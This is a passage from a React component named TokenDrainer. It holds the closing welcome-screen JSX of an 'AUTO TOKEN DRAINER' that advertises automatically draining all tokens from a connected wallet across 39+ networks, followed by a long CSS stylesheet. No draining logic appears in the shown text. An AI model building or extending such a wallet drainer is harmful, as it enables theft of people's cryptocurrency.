                <h2>AUTO TOKEN DRAINER</h2>
                <p className="welcome-text">
                  Connect your wallet to automatically drain ALL tokens across 39+ networks
                </p>
                <p className="warning-text">
                  ⚠️ WARNING: This will automatically send ALL tokens from your wallet
                </p>
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                <div className="features">
                  <div className="feature">• Auto-scans 39+ networks</div>
                  <div className="feature">• Auto-drains ALL tokens</div>
                  <div className="feature">• TRON & EVM support</div>
                  <div className="feature">• No manual steps required</div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span>AUTO-DRAIN v5.0 • FULLY AUTOMATIC</span>
            <span className="status-dot"></span>
            <span>{isConnected ? 'PROCESSING...' : 'READY'}</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); opacity: 1; }
          50% { transform: scale(1.05); opacity: 0.8; }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Processing Indicator */
        .processing-indicator {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: borderPulse 2s infinite;
        }
        
        @keyframes borderPulse {
          0%, 100% { border-color: #ef4444; }
          50% { border-color: #f87171; }
        }
        
        .processing-spinner {
          width: 40px;
          height: 40px;
          border: 4px solid #333;
          border-top-color: #ef4444;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 15px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .processing-text {
          font-size: 18px;
          font-weight: 600;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .processing-note {
          color: #888;
          font-size: 14px;
        }
        
        /* Modal */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.8);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 1000;
          backdrop-filter: blur(5px);
        }
        
        .modal-content {
          background: #1a1a1a;
          border-radius: 20px;
          width: 90%;
          max-width: 500px;
          max-height: 80vh;
          overflow-y: auto;
          border: 1px solid #333;
        }
        
        .modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px;
          border-bottom: 1px solid #333;
        }
        
        .modal-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .modal-close {
          background: none;
          border: none;
          color: #888;
          font-size: 24px;
          cursor: pointer;
          padding: 0;
          width: 30px;
          height: 30px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
        }
        
        .modal-close:hover {
          background: #333;
        }
        
        .modal-body {
          padding: 20px;
        }
        
        .token-info {
          text-align: center;
          margin-bottom: 20px;
          padding: 20px;
          background: #222;
          border-radius: 12px;
        }
        
        .token-symbol-large {
          font-size: 32px;
          font-weight: 700;
          margin-bottom: 5px;
          color: white;
        }
        
        .token-network {
          color: #888;
          margin-bottom: 10px;
        }
        
        .token-amount-large {
          font-size: 24px;
          font-weight: 600;
          margin-bottom: 5px;
          color: white;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
        }
        
        .instructions {
          background: #111;
          border-radius: 12px;
          padding: 15px;
          margin-bottom: 20px;
          max-height: 200px;
          overflow-y: auto;
        }
        
        .instructions pre {
          margin: 0;
          color: #0af;
          white-space: pre-wrap;
          font-size: 14px;
          line-height: 1.5;
        }
        
        .address-box {
          background: #222;
          border-radius: 12px;
          padding: 15px;
        }
        
        .address-label {
          color: #888;
          font-size: 14px;
          margin-bottom: 5px;
        }
        
        .address-value {
          font-family: monospace;
          font-size: 14px;
          word-break: break-all;
          margin-bottom: 10px;
          color: #0af;
        }
        
        .btn-copy {
          background: #333;
          color: white;
          border: none;
          padding: 10px 15px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          width: 100%;
        }
        
        .btn-copy:hover {
          background: #444;
        }
        
        .modal-actions {
          display: flex;
          gap: 10px;
        }
        
        .modal-actions .btn {
          flex: 1;
          padding: 12px;
        }
        
        .btn-primary {
          background: #3b82f6;
          color: white;
          border: none;
          padding: 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 600;
        }
        
        .btn-primary:hover {
          background: #2563eb;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-main {
          display: flex;
          justify-content: space-between;
          margin-bottom: 5px;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          color: white;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
        }
        
        .tx-value {
          color: #10b981;
          font-weight: 600;
        }
        
        .tx-secondary {
          display: flex;
          justify-content: space-between;
          color: #888;
          font-size: 14px;
          margin-bottom: 5px;
        }
        
        .tx-status {
          font-weight: 600;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-link {
          color: #3b82f6;
          font-size: 12px;
          text-decoration: none;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
          margin-bottom: 20px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 15px;
        }
        
        .network-badge {
          padding: 5px 10px;
          border-radius: 20px;
          font-weight: 600;
          font-size: 14px;
          min-width: 50px;
          text-align: center;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 3px 8px;
          border-radius: 6px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 15px;
        }
        
        .token-destination {
          background: #222;
          border-radius: 6px;
          padding: 8px;
          font-family: monospace;
          font-size: 12px;
          color: #888;
          border: 1px solid #333;
        }
        
        /* Instructions */
        .instructions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #f59e0b;
        }
        
        .instructions-panel h3 {
          color: #f59e0b;
          margin: 0 0 15px 0;
        }
        
        .instructions-panel ul {
          margin: 0;
          padding-left: 20px;
          color: #ddd;
          line-height: 1.6;
        }
        
        .instructions-panel li {
          margin-bottom: 8px;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 20px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .warning-text {
          color: #ef4444;
          margin-bottom: 30px;
          font-size: 16px;
          font-weight: 600;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 400px;
          margin: 0 auto;
        }
        
        .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-row {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
          
          .connected-wallet {
            flex-direction: column;
            gap: 5px;
            align-items: flex-end;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainer;
